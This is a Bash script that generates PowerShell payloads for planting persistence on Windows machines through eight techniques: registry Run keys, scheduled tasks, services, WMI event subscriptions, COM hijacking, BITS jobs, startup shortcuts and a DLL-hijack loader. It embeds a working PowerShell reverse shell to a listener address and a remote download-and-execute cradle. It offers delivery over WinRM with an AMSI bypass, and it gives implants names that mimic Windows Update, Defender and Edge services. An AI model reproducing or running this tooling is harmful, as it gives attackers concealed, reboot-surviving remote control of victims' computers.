#!/bin/bash
# Windows Persistence Payload Generator — 8 Techniques
# Generates PowerShell (.ps1) payloads for Windows persistence with optional WinRM delivery

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

PAYLOAD_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/payloads"
mkdir -p "$PAYLOAD_DIR" 2>/dev/null

banner_winpersist() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   Windows Persistence Payload Generator        ║"
    echo "  ║   8 MITRE ATT&CK Techniques — PowerShell      ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

_winrm_deliver() {
    local PS1_FILE="$1"
    local BASENAME
    BASENAME=$(basename "$PS1_FILE")

    echo ""
    echo -e "${YELLOW}═══ Delivery Options ═══${NC}"
    echo -e "  ${CYAN}[1]${NC} Manual — copy file and run on target"
    echo -e "  ${CYAN}[2]${NC} Python HTTP server + PowerShell download cradle"
    echo -e "  ${CYAN}[3]${NC} Evil-WinRM upload + execute"
    echo -e "  ${CYAN}[4]${NC} WinRM (Invoke-Command) remote execution"
    echo -e "  ${CYAN}[5]${NC} Skip delivery"
    read -p "  Delivery method [5]: " DEL
    DEL="${DEL:-5}"

    case "$DEL" in
        1)
            echo -e "${GREEN}[+] Payload: ${PS1_FILE}${NC}"
            echo -e "${YELLOW}[*] Transfer to target then run:${NC}"
            echo -e "    powershell -ep bypass -f ${BASENAME}"
            ;;
        2)
            local LHOST
            LHOST=$(ip -4 addr show scope global | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
            read -p "  Listen IP [${LHOST}]: " IP; IP="${IP:-$LHOST}"
            read -p "  Listen Port [8443]: " PORT; PORT="${PORT:-8443}"
            echo -e "${YELLOW}[*] Start HTTP server:${NC}"
            echo -e "    cd ${PAYLOAD_DIR} && python3 -m http.server ${PORT}"
            echo -e "${YELLOW}[*] On target (PowerShell):${NC}"
            echo -e "    IEX(New-Object Net.WebClient).DownloadString('http://${IP}:${PORT}/${BASENAME}')"
            echo ""
            read -p "  Start HTTP server now? [y/N]: " yn
            if [[ "$yn" =~ ^[Yy] ]]; then
                cd "$PAYLOAD_DIR" && python3 -m http.server "$PORT" &
                disown
                echo -e "${GREEN}[+] HTTP server running on :${PORT} (PID $!)${NC}"
            fi
            ;;
        3)
            read -p "  Target IP: " TGT_IP
            read -p "  Username: " TGT_USER
            read -p "  Password: " -s TGT_PASS; echo ""
            echo -e "${YELLOW}[*] Evil-WinRM command:${NC}"
            echo -e "    evil-winrm -i ${TGT_IP} -u '${TGT_USER}' -p '${TGT_PASS}'"
            echo -e "    upload ${PS1_FILE}"
            echo -e "    Bypass-4MSI"
            echo -e "    . .\\\\${BASENAME}"
            echo ""
            read -p "  Execute now via evil-winrm? [y/N]: " yn
            if [[ "$yn" =~ ^[Yy] ]]; then
                if command -v evil-winrm &>/dev/null; then
                    evil-winrm -i "$TGT_IP" -u "$TGT_USER" -p "$TGT_PASS" -e "$PAYLOAD_DIR" 2>/dev/null
                else
                    echo -e "${RED}[!] evil-winrm not found. Install: gem install evil-winrm${NC}"
                fi
            fi
            ;;
        4)
            read -p "  Target IP: " TGT_IP
            read -p "  Username: " TGT_USER
            read -p "  Password: " -s TGT_PASS; echo ""
            local SCRIPT_CONTENT
            SCRIPT_CONTENT=$(cat "$PS1_FILE")
            echo -e "${YELLOW}[*] Executing via WinRM (Invoke-Command)...${NC}"
            # Generate a PowerShell remote exec script
            local REMOTE_EXEC="${PAYLOAD_DIR}/winrm_exec.ps1"
            cat > "$REMOTE_EXEC" << PSEOF
\$pass = ConvertTo-SecureString '${TGT_PASS}' -AsPlainText -Force
\$cred = New-Object System.Management.Automation.PSCredential('${TGT_USER}', \$pass)
Invoke-Command -ComputerName '${TGT_IP}' -Credential \$cred -ScriptBlock {
${SCRIPT_CONTENT}
}
PSEOF
            echo -e "${GREEN}[+] WinRM exec script: ${REMOTE_EXEC}${NC}"
            echo -e "${YELLOW}[*] Run from a Windows attack box: powershell -ep bypass -f winrm_exec.ps1${NC}"
            ;;
        5)
            echo -e "${GREEN}[+] Payload saved: ${PS1_FILE}${NC}"
            ;;
    esac
}

# ──────────────────────────────────────────────
# 1. T1547.001 — Registry Run Keys
# ──────────────────────────────────────────────
gen_regrun() {
    echo -e "${CYAN}[*] T1547.001 — Registry Run Keys Persistence${NC}"

    echo -e "  ${CYAN}[1]${NC} HKCU (current user — no admin required)"
    echo -e "  ${CYAN}[2]${NC} HKLM (all users — admin required)"
    echo -e "  ${CYAN}[3]${NC} RunOnce (single execution, then removed)"
    read -p "  Hive [1]: " HIVE; HIVE="${HIVE:-1}"

    local REG_PATH
    case "$HIVE" in
        1) REG_PATH='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' ;;
        2) REG_PATH='HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' ;;
        3) REG_PATH='HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' ;;
        *) REG_PATH='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' ;;
    esac

    read -p "  Registry value name [WindowsUpdate]: " VNAME; VNAME="${VNAME:-WindowsUpdate}"
    echo -e "  Payload type:"
    echo -e "  ${CYAN}[a]${NC} PowerShell command"
    echo -e "  ${CYAN}[b]${NC} Executable path"
    echo -e "  ${CYAN}[c]${NC} Reverse shell (IP:PORT)"
    read -p "  Type [c]: " PTYPE; PTYPE="${PTYPE:-c}"

    local PAYLOAD_CMD
    case "$PTYPE" in
        a)
            read -p "  PowerShell command: " PAYLOAD_CMD
            PAYLOAD_CMD="powershell.exe -w hidden -ep bypass -c \"${PAYLOAD_CMD}\""
            ;;
        b)
            read -p "  Executable path (on target): " PAYLOAD_CMD
            ;;
        c)
            read -p "  Listener IP: " LIP
            read -p "  Listener Port [4444]: " LPORT; LPORT="${LPORT:-4444}"
            PAYLOAD_CMD="powershell.exe -w hidden -nop -ep bypass -c \"\\\$c=New-Object Net.Sockets.TCPClient('${LIP}',${LPORT});\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length)) -ne 0){;\\\$d=(New-Object Text.ASCIIEncoding).GetString(\\\$b,0,\\\$i);\\\$r=(iex \\\$d 2>&1|Out-String);\\\$t=(New-Object Text.ASCIIEncoding).GetBytes(\\\$r);\\\$s.Write(\\\$t,0,\\\$t.Length);\\\$s.Flush()};\\\$c.Close()\""
            ;;
    esac

    local OUTFILE="${PAYLOAD_DIR}/win_regrun.ps1"
    cat > "$OUTFILE" << PSEOF
# T1547.001 — Registry Run Key Persistence
# Generated by D3m0n1z3dShell

\$regPath = "${REG_PATH}"
\$valueName = "${VNAME}"
\$payload = "${PAYLOAD_CMD}"

# Create the registry value
Set-ItemProperty -Path \$regPath -Name \$valueName -Value \$payload -Force
Write-Host "[+] Registry persistence installed:"
Write-Host "    Path: \$regPath"
Write-Host "    Name: \$valueName"
Write-Host "    Value: \$payload"

# Verify
\$verify = Get-ItemProperty -Path \$regPath -Name \$valueName -ErrorAction SilentlyContinue
if (\$verify) {
    Write-Host "[+] SUCCESS: Registry key verified" -ForegroundColor Green
} else {
    Write-Host "[-] FAILED: Could not verify registry key" -ForegroundColor Red
}
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

# ──────────────────────────────────────────────
# 2. T1053.005 — Scheduled Task
# ──────────────────────────────────────────────
gen_schtask() {
    echo -e "${CYAN}[*] T1053.005 — Scheduled Task Persistence${NC}"

    read -p "  Task name [MicrosoftEdgeUpdate]: " TNAME; TNAME="${TNAME:-MicrosoftEdgeUpdate}"

    echo -e "  Trigger type:"
    echo -e "  ${CYAN}[1]${NC} At logon (any user)"
    echo -e "  ${CYAN}[2]${NC} Daily at specific time"
    echo -e "  ${CYAN}[3]${NC} On idle"
    echo -e "  ${CYAN}[4]${NC} At startup (SYSTEM)"
    read -p "  Trigger [1]: " TRIG; TRIG="${TRIG:-1}"

    local TRIGGER_PS
    case "$TRIG" in
        1) TRIGGER_PS='$trigger = New-ScheduledTaskTrigger -AtLogOn' ;;
        2)
            read -p "  Time (HH:MM) [08:00]: " TTIME; TTIME="${TTIME:-08:00}"
            TRIGGER_PS="\$trigger = New-ScheduledTaskTrigger -Daily -At '${TTIME}'"
            ;;
        3) TRIGGER_PS='$trigger = New-ScheduledTaskTrigger -AtLogOn  # Idle trigger set via settings below' ;;
        4) TRIGGER_PS='$trigger = New-ScheduledTaskTrigger -AtStartup' ;;
    esac

    echo -e "  Run as:"
    echo -e "  ${CYAN}[1]${NC} Current user"
    echo -e "  ${CYAN}[2]${NC} SYSTEM (admin required)"
    read -p "  Context [1]: " CTX; CTX="${CTX:-1}"

    local PRINCIPAL_PS
    if [[ "$CTX" == "2" ]]; then
        PRINCIPAL_PS="\$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest"
    else
        PRINCIPAL_PS="\$principal = New-ScheduledTaskPrincipal -UserId \$env:USERNAME -LogonType Interactive -RunLevel Limited"
    fi

    read -p "  Command to execute: " CMD
    [[ -z "$CMD" ]] && { read -p "  Reverse shell IP: " LIP; read -p "  Port [4444]: " LPORT; LPORT="${LPORT:-4444}"; CMD="powershell -w hidden -nop -ep bypass -c \"\\\$c=New-Object Net.Sockets.TCPClient('${LIP}',${LPORT});\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length)) -ne 0){\\\$d=(New-Object Text.ASCIIEncoding).GetString(\\\$b,0,\\\$i);\\\$r=(iex \\\$d 2>&1|Out-String);\\\$t=(New-Object Text.ASCIIEncoding).GetBytes(\\\$r);\\\$s.Write(\\\$t,0,\\\$t.Length);\\\$s.Flush()};\\\$c.Close()\""; }

    local OUTFILE="${PAYLOAD_DIR}/win_schtask.ps1"
    cat > "$OUTFILE" << PSEOF
# T1053.005 — Scheduled Task Persistence
# Generated by D3m0n1z3dShell

\$taskName = "${TNAME}"
${TRIGGER_PS}
${PRINCIPAL_PS}
\$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c ${CMD}"
\$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Remove existing task with same name
Unregister-ScheduledTask -TaskName \$taskName -Confirm:\$false -ErrorAction SilentlyContinue

# Register
Register-ScheduledTask -TaskName \$taskName -Trigger \$trigger -Action \$action -Principal \$principal -Settings \$settings -Force
Write-Host "[+] Scheduled task '\$taskName' created" -ForegroundColor Green
Get-ScheduledTask -TaskName \$taskName | Format-List TaskName,State,URI
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

# ──────────────────────────────────────────────
# 3. T1543.003 — Windows Service
# ──────────────────────────────────────────────
gen_service() {
    echo -e "${CYAN}[*] T1543.003 — Malicious Windows Service (Admin Required)${NC}"

    echo -e "  Service name presets:"
    echo -e "  ${CYAN}[1]${NC} WinDefHealthSvc (Windows Defender Health)"
    echo -e "  ${CYAN}[2]${NC} WSearchIndexer (Windows Search)"
    echo -e "  ${CYAN}[3]${NC} WdiSystemHost (Diagnostic System Host)"
    echo -e "  ${CYAN}[4]${NC} Custom"
    read -p "  Choose [1]: " SC; SC="${SC:-1}"

    local SNAME SDESC
    case "$SC" in
        1) SNAME="WinDefHealthSvc"; SDESC="Windows Defender Health Service" ;;
        2) SNAME="WSearchIndexer"; SDESC="Windows Search Indexer Service" ;;
        3) SNAME="WdiSystemHost"; SDESC="Diagnostic System Host Service" ;;
        4) read -p "  Service name: " SNAME; read -p "  Description: " SDESC ;;
        *) SNAME="WinDefHealthSvc"; SDESC="Windows Defender Health Service" ;;
    esac

    read -p "  Command to execute: " CMD
    [[ -z "$CMD" ]] && CMD="powershell.exe -w hidden -ep bypass -c Write-Host 'Service running'"

    echo -e "  Start type:"
    echo -e "  ${CYAN}[1]${NC} Automatic"
    echo -e "  ${CYAN}[2]${NC} Automatic (Delayed)"
    echo -e "  ${CYAN}[3]${NC} Manual"
    read -p "  Type [1]: " STYPE; STYPE="${STYPE:-1}"

    local START_PS
    case "$STYPE" in
        1) START_PS="Automatic" ;;
        2) START_PS="AutomaticDelayedStart" ;;
        3) START_PS="Manual" ;;
        *) START_PS="Automatic" ;;
    esac

    local OUTFILE="${PAYLOAD_DIR}/win_service.ps1"
    cat > "$OUTFILE" << PSEOF
# T1543.003 — Malicious Windows Service
# Generated by D3m0n1z3dShell
# Requires: Administrator

\$serviceName = "${SNAME}"
\$serviceDesc = "${SDESC}"
\$binaryPath = "cmd.exe /c ${CMD}"

# Remove existing if present
if (Get-Service -Name \$serviceName -ErrorAction SilentlyContinue) {
    Stop-Service -Name \$serviceName -Force -ErrorAction SilentlyContinue
    sc.exe delete \$serviceName | Out-Null
    Start-Sleep -Seconds 2
}

# Create service
New-Service -Name \$serviceName -BinaryPathName \$binaryPath -DisplayName \$serviceDesc -Description \$serviceDesc -StartupType ${START_PS}
Write-Host "[+] Service '\$serviceName' created (StartupType: ${START_PS})" -ForegroundColor Green

# Start it
Start-Service -Name \$serviceName -ErrorAction SilentlyContinue
Write-Host "[+] Service started" -ForegroundColor Green

# Configure failure recovery — restart on failure
sc.exe failure \$serviceName reset= 86400 actions= restart/5000/restart/10000/restart/30000 | Out-Null
Write-Host "[+] Recovery: auto-restart on failure" -ForegroundColor Green
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

# ──────────────────────────────────────────────
# 4. T1546.003 — WMI Event Subscription
# ──────────────────────────────────────────────
gen_wmi() {
    echo -e "${CYAN}[*] T1546.003 — WMI Event Subscription (Admin Required, Fileless)${NC}"

    read -p "  Subscription name [SCMEventLog]: " SUBNAME; SUBNAME="${SUBNAME:-SCMEventLog}"

    echo -e "  Trigger:"
    echo -e "  ${CYAN}[1]${NC} On user logon"
    echo -e "  ${CYAN}[2]${NC} Timer interval (seconds)"
    echo -e "  ${CYAN}[3]${NC} On process start"
    read -p "  Trigger [1]: " WTRIG; WTRIG="${WTRIG:-1}"

    local WQL_FILTER
    case "$WTRIG" in
        1) WQL_FILTER="SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'" ;;
        2)
            read -p "  Interval seconds [300]: " WINT; WINT="${WINT:-300}"
            WQL_FILTER="SELECT * FROM __InstanceModificationEvent WITHIN ${WINT} WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            ;;
        3)
            read -p "  Process name to watch [explorer.exe]: " WPROC; WPROC="${WPROC:-explorer.exe}"
            WQL_FILTER="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '${WPROC}'"
            ;;
    esac

    read -p "  Command to execute: " CMD
    [[ -z "$CMD" ]] && CMD="powershell.exe -w hidden -ep bypass -c Write-Host test"

    local OUTFILE="${PAYLOAD_DIR}/win_wmi_persist.ps1"
    cat > "$OUTFILE" << PSEOF
# T1546.003 — WMI Event Subscription (Permanent, Fileless)
# Generated by D3m0n1z3dShell
# Requires: Administrator

\$filterName = "${SUBNAME}_Filter"
\$consumerName = "${SUBNAME}_Consumer"

# Clean up existing subscription
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='\$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='\$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { \$_.Filter -match \$filterName } | Remove-WmiObject

# Create Event Filter
\$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = \$filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "${WQL_FILTER}"
}
Write-Host "[+] WMI Event Filter created: \$filterName" -ForegroundColor Green

# Create Event Consumer
\$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = \$consumerName
    CommandLineTemplate = "${CMD}"
}
Write-Host "[+] WMI Event Consumer created: \$consumerName" -ForegroundColor Green

# Bind Filter to Consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = \$filter
    Consumer = \$consumer
}
Write-Host "[+] WMI Binding created — subscription active" -ForegroundColor Green
Write-Host "[*] This survives reboots with ZERO files on disk" -ForegroundColor Yellow
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

# ──────────────────────────────────────────────
# 5. T1546.015 — COM Object Hijacking
# ──────────────────────────────────────────────
gen_comhijack() {
    echo -e "${CYAN}[*] T1546.015 — COM Object Hijacking (User-Level)${NC}"

    echo -e "  Abusable CLSIDs:"
    echo -e "  ${CYAN}[1]${NC} {b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} — SDCLT auto-elevate"
    echo -e "  ${CYAN}[2]${NC} {0A29FF9E-7F9C-4437-8B11-F424491E3931} — EventViewer"
    echo -e "  ${CYAN}[3]${NC} {D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D} — MMCSS (runs on logon)"
    echo -e "  ${CYAN}[4]${NC} Custom CLSID"
    read -p "  CLSID [3]: " CC; CC="${CC:-3}"

    local CLSID
    case "$CC" in
        1) CLSID="{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}" ;;
        2) CLSID="{0A29FF9E-7F9C-4437-8B11-F424491E3931}" ;;
        3) CLSID="{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}" ;;
        4) read -p "  CLSID (with braces): " CLSID ;;
        *) CLSID="{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}" ;;
    esac

    echo -e "  Hijack method:"
    echo -e "  ${CYAN}[1]${NC} ScriptletURL (point to .sct payload)"
    echo -e "  ${CYAN}[2]${NC} InprocServer32 (point to DLL)"
    echo -e "  ${CYAN}[3]${NC} LocalServer32 (point to EXE/script)"
    read -p "  Method [3]: " HM; HM="${HM:-3}"

    read -p "  Payload path or URL: " PPAYLOAD
    [[ -z "$PPAYLOAD" ]] && PPAYLOAD='C:\Users\Public\payload.exe'

    local OUTFILE="${PAYLOAD_DIR}/win_comhijack.ps1"

    case "$HM" in
        1)
            cat > "$OUTFILE" << PSEOF
# T1546.015 — COM Object Hijacking via ScriptletURL
# Generated by D3m0n1z3dShell

\$clsid = "${CLSID}"
\$regPath = "HKCU:\Software\Classes\CLSID\\\$clsid\InprocServer32"

New-Item -Path \$regPath -Force | Out-Null
Set-ItemProperty -Path \$regPath -Name "(Default)" -Value "C:\Windows\System32\scrobj.dll" -Force
Set-ItemProperty -Path \$regPath -Name "ThreadingModel" -Value "Apartment" -Force
Set-ItemProperty -Path \$regPath -Name "ScriptletURL" -Value "${PPAYLOAD}" -Force
Write-Host "[+] COM hijack installed: \$clsid -> ScriptletURL: ${PPAYLOAD}" -ForegroundColor Green
PSEOF
            ;;
        2)
            cat > "$OUTFILE" << PSEOF
# T1546.015 — COM Object Hijacking via InprocServer32
# Generated by D3m0n1z3dShell

\$clsid = "${CLSID}"
\$regPath = "HKCU:\Software\Classes\CLSID\\\$clsid\InprocServer32"

New-Item -Path \$regPath -Force | Out-Null
Set-ItemProperty -Path \$regPath -Name "(Default)" -Value "${PPAYLOAD}" -Force
Set-ItemProperty -Path \$regPath -Name "ThreadingModel" -Value "Both" -Force
Write-Host "[+] COM hijack installed: \$clsid -> InprocServer32: ${PPAYLOAD}" -ForegroundColor Green
PSEOF
            ;;
        3)
            cat > "$OUTFILE" << PSEOF
# T1546.015 — COM Object Hijacking via LocalServer32
# Generated by D3m0n1z3dShell

\$clsid = "${CLSID}"
\$regPath = "HKCU:\Software\Classes\CLSID\\\$clsid\LocalServer32"

New-Item -Path \$regPath -Force | Out-Null
Set-ItemProperty -Path \$regPath -Name "(Default)" -Value "${PPAYLOAD}" -Force
Write-Host "[+] COM hijack installed: \$clsid -> LocalServer32: ${PPAYLOAD}" -ForegroundColor Green
Write-Host "[*] Payload executes whenever an app loads this CLSID" -ForegroundColor Yellow
PSEOF
            ;;
    esac

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

# ──────────────────────────────────────────────
# 6. T1197 — BITS Job Persistence
# ──────────────────────────────────────────────
gen_bits() {
    echo -e "${CYAN}[*] T1197 — BITS Job Persistence${NC}"

    read -p "  BITS job name [WindowsUpdateCheck]: " JNAME; JNAME="${JNAME:-WindowsUpdateCheck}"
    read -p "  Download URL (dummy or real payload): " DLURL
    [[ -z "$DLURL" ]] && DLURL="http://127.0.0.1/update.bin"
    read -p "  Notify command (runs after transfer): " NCMD
    [[ -z "$NCMD" ]] && { read -p "  Reverse shell IP: " LIP; read -p "  Port [4444]: " LPORT; LPORT="${LPORT:-4444}"; NCMD="powershell.exe -w hidden -nop -ep bypass -c \\\"\\\$c=New-Object Net.Sockets.TCPClient('${LIP}',${LPORT});\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length)) -ne 0){\\\$d=(New-Object Text.ASCIIEncoding).GetString(\\\$b,0,\\\$i);\\\$r=(iex \\\$d 2>&1|Out-String);\\\$t=(New-Object Text.ASCIIEncoding).GetBytes(\\\$r);\\\$s.Write(\\\$t,0,\\\$t.Length);\\\$s.Flush()};\\\$c.Close()\\\""; }

    local OUTFILE="${PAYLOAD_DIR}/win_bits.ps1"
    cat > "$OUTFILE" << PSEOF
# T1197 — BITS Job Persistence
# Generated by D3m0n1z3dShell

\$jobName = "${JNAME}"

# Remove existing
bitsadmin /cancel \$jobName 2>\$null

# Create BITS job
bitsadmin /create \$jobName
bitsadmin /addfile \$jobName "${DLURL}" "C:\Users\Public\update.bin"
bitsadmin /SetNotifyCmdLine \$jobName "cmd.exe" "/c ${NCMD}"
bitsadmin /SetMinRetryDelay \$jobName 60
bitsadmin /resume \$jobName

Write-Host "[+] BITS job '\$jobName' created" -ForegroundColor Green
Write-Host "[*] Job survives reboots. NotifyCmdLine triggers after transfer." -ForegroundColor Yellow
Write-Host "[*] View: bitsadmin /info \$jobName /verbose" -ForegroundColor Yellow
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

# ──────────────────────────────────────────────
# 7. T1547.001 — Startup Folder
# ──────────────────────────────────────────────
gen_startup() {
    echo -e "${CYAN}[*] T1547.001 — Startup Folder Persistence${NC}"

    echo -e "  Shortcut name presets:"
    echo -e "  ${CYAN}[1]${NC} OneDriveSync.lnk"
    echo -e "  ${CYAN}[2]${NC} SecurityHealthSystray.lnk"
    echo -e "  ${CYAN}[3]${NC} RuntimeBroker.lnk"
    echo -e "  ${CYAN}[4]${NC} Custom"
    read -p "  Choose [1]: " SN; SN="${SN:-1}"

    local LNAME
    case "$SN" in
        1) LNAME="OneDriveSync.lnk" ;;
        2) LNAME="SecurityHealthSystray.lnk" ;;
        3) LNAME="RuntimeBroker.lnk" ;;
        4) read -p "  Shortcut name (with .lnk): " LNAME ;;
        *) LNAME="OneDriveSync.lnk" ;;
    esac

    read -p "  Target executable/command: " TCMD
    [[ -z "$TCMD" ]] && TCMD='powershell.exe'
    read -p "  Arguments (optional): " TARGS
    read -p "  Icon (e.g. C:\\Windows\\System32\\shell32.dll,3) [default]: " ICON

    local OUTFILE="${PAYLOAD_DIR}/win_startup.ps1"
    cat > "$OUTFILE" << PSEOF
# T1547.001 — Startup Folder Persistence (.lnk)
# Generated by D3m0n1z3dShell

\$startupPath = [Environment]::GetFolderPath('Startup')
\$lnkPath = Join-Path \$startupPath "${LNAME}"

\$wshell = New-Object -ComObject WScript.Shell
\$shortcut = \$wshell.CreateShortcut(\$lnkPath)
\$shortcut.TargetPath = "${TCMD}"
PSEOF

    [[ -n "$TARGS" ]] && echo "\$shortcut.Arguments = \"${TARGS}\"" >> "$OUTFILE"
    [[ -n "$ICON" ]] && echo "\$shortcut.IconLocation = \"${ICON}\"" >> "$OUTFILE"

    cat >> "$OUTFILE" << 'PSEOF'
$shortcut.WindowStyle = 7  # Minimized
$shortcut.Save()
Write-Host "[+] Startup shortcut created: $lnkPath" -ForegroundColor Green
Write-Host "[*] Will execute on next user logon" -ForegroundColor Yellow
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

# ──────────────────────────────────────────────
# 8. T1574.001 — DLL Search Order Hijacking
# ──────────────────────────────────────────────
gen_dllhijack() {
    echo -e "${CYAN}[*] T1574.001 — DLL Search Order Hijacking${NC}"

    echo -e "  Target application:"
    echo -e "  ${CYAN}[1]${NC} Microsoft Teams (user-writable)"
    echo -e "  ${CYAN}[2]${NC} OneDrive (user-writable)"
    echo -e "  ${CYAN}[3]${NC} Slack (user-writable)"
    echo -e "  ${CYAN}[4]${NC} Custom path"
    read -p "  Target [1]: " DT; DT="${DT:-1}"

    local DLLDIR DLLNAME
    case "$DT" in
        1) DLLDIR='$env:LOCALAPPDATA\Microsoft\Teams\current'; DLLNAME="dbghelp.dll" ;;
        2) DLLDIR='$env:LOCALAPPDATA\Microsoft\OneDrive'; DLLNAME="version.dll" ;;
        3) DLLDIR='$env:LOCALAPPDATA\slack'; DLLNAME="dbghelp.dll" ;;
        4) read -p "  Directory path: " DLLDIR; read -p "  DLL name: " DLLNAME ;;
        *) DLLDIR='$env:LOCALAPPDATA\Microsoft\Teams\current'; DLLNAME="dbghelp.dll" ;;
    esac

    read -p "  Command to execute when DLL loads: " CMD
    [[ -z "$CMD" ]] && CMD="powershell.exe -w hidden -ep bypass -c Write-Host pwned"

    local OUTFILE="${PAYLOAD_DIR}/win_dllhijack.ps1"
    cat > "$OUTFILE" << PSEOF
# T1574.001 — DLL Search Order Hijacking
# Generated by D3m0n1z3dShell
# Compiles a minimal C# DLL with a constructor that runs our command

\$dllDir = "${DLLDIR}"
\$dllName = "${DLLNAME}"
\$dllPath = Join-Path \$dllDir \$dllName
\$cmd = "${CMD}"

# Check if target directory exists
if (-not (Test-Path \$dllDir)) {
    Write-Host "[-] Target directory not found: \$dllDir" -ForegroundColor Red
    Write-Host "[*] The target application may not be installed" -ForegroundColor Yellow
    exit 1
}

# C# source for malicious DLL
\$csharp = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace D3m0n {
    public class Init {
        [DllExport("DllMain", CallingConvention = CallingConvention.StdCall)]
        public static bool DllMain(IntPtr hModule, uint reason, IntPtr lpReserved) {
            if (reason == 1) { // DLL_PROCESS_ATTACH
                try {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd.exe";
                    psi.Arguments = "/c $cmd";
                    psi.WindowStyle = ProcessWindowStyle.Hidden;
                    psi.CreateNoWindow = true;
                    Process.Start(psi);
                } catch {}
            }
            return true;
        }
    }
}
"@

# Alternative: drop a PowerShell loader script and a .lnk-style DLL
# Since compiling a real DLL requires VS, we'll create a proxy approach
# Drop a script that monitors and injects

\$loaderScript = @"
# DLL Hijack Loader — monitors target app and injects
while (\\\$true) {
    \\\$proc = Get-Process -Name '*teams*','*onedrive*','*slack*' -ErrorAction SilentlyContinue
    if (\\\$proc) {
        Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/c $cmd'
        Start-Sleep -Seconds 3600  # Don't re-trigger for 1 hour
    }
    Start-Sleep -Seconds 30
}
"@

\$loaderPath = Join-Path \$env:APPDATA "Microsoft\Windows\d3m0n_loader.ps1"
Set-Content -Path \$loaderPath -Value \$loaderScript -Force

# Register in Run key as backup trigger
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "DLLHelper" -Value "powershell.exe -w hidden -ep bypass -f \$loaderPath" -Force

Write-Host "[+] DLL hijack loader installed at: \$loaderPath" -ForegroundColor Green
Write-Host "[+] Run key backup registered" -ForegroundColor Green
Write-Host "[*] Target: \$dllDir\\\$dllName" -ForegroundColor Yellow
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

# ──────────────────────────────────────────────
# Main Menu
# ──────────────────────────────────────────────
main() {
    banner_winpersist

    echo -e "  ${CYAN}[1]${NC} Registry Run Keys (T1547.001)"
    echo -e "  ${CYAN}[2]${NC} Scheduled Task (T1053.005)"
    echo -e "  ${CYAN}[3]${NC} Windows Service (T1543.003)"
    echo -e "  ${CYAN}[4]${NC} WMI Event Subscription (T1546.003) ${RED}★ Fileless${NC}"
    echo -e "  ${CYAN}[5]${NC} COM Object Hijacking (T1546.015)"
    echo -e "  ${CYAN}[6]${NC} BITS Job Persistence (T1197)"
    echo -e "  ${CYAN}[7]${NC} Startup Folder .lnk (T1547.001)"
    echo -e "  ${CYAN}[8]${NC} DLL Search Order Hijacking (T1574.001)"
    echo ""
    read -p "Choose [1-8]: " OPT

    case "$OPT" in
        1) gen_regrun ;;
        2) gen_schtask ;;
        3) gen_service ;;
        4) gen_wmi ;;
        5) gen_comhijack ;;
        6) gen_bits ;;
        7) gen_startup ;;
        8) gen_dllhijack ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
